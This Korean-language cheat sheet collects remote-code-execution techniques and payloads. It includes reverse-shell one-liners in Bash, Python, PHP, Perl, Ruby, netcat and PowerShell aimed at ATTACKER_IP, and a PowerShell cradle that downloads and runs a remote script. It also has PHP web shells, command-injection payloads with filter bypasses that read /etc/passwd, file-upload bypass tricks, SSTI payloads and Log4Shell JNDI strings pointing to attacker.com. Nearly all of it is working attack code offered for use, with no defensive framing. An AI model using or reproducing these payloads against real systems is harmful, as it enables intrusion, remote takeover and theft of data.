# RCE (Remote Code Execution) — 기법 & 페이로드

## 리버스 쉘 원라이너

### Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Python
```python
# Python 3
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```php
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

# PHP 웹쉘
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
<?php $c=$_POST['c'];echo `$c`; ?>
```

### Perl
```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### NetCat
```bash
nc -e /bin/bash ATTACKER_IP 4444
nc -e /bin/sh ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

### PowerShell (Windows)
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')"

$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String);
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
$client.Close()
```

## TTY 업그레이드
```bash
# 1단계: Python PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'

# 2단계: 터미널 설정
Ctrl+Z  (백그라운드)
stty raw -echo; fg
reset

# 3단계: 크기 맞추기
export TERM=xterm
stty rows 50 cols 200
```

## 커맨드 인젝션 페이로드
```
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)

# 필터 우회
w'h'o'a'm'i
w"h"o"a"m"i
wh\oami
/bin/w*oami
/???/w?oami
$(printf "\x77\x68\x6f\x61\x6d\x69")

# 공백 우회
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'\x20';cat${X}/etc/passwd
```

## 파일 업로드 → RCE
```
# PHP 확장자 우회
.php .php3 .php4 .php5 .php7 .phtml .pht .phps .phar .shtml .shtm
.PHP .PhP .pHp (대소문자)

# Content-Type 우회
image/jpeg 로 전송 후 .php 확장자

# 이중 확장자
shell.php.jpg
shell.php%00.jpg  (null byte, 구버전)
shell.php;.jpg

# .htaccess 업로드 (Apache)
AddType application/x-httpd-php .jpg

# Multipart 경계 조작
Content-Disposition: form-data; name="file"; filename="shell.php"
```

## SSTI → RCE
```python
# Jinja2 (Python/Flask)
{{7*7}}                          # 탐지
{{config}}                       # 설정 덤프
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[SUBPROCESS_INDEX](['id'],stdout=-1).communicate()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP)
{{7*7}}
{{"/etc/passwd"|file_get_contents}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## Log4Shell (CVE-2021-44228)
```
${jndi:ldap://attacker.com:1389/a}
${jndi:dns://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
${${lower:j}ndi:${lower:l}dap://attacker.com/a}
${${::-j}ndi:rmi://attacker.com/a}
```

## 리스너 설정
```bash
# NetCat
nc -lvnp 4444

# Socat (더 안정적)
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# msfconsole
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```
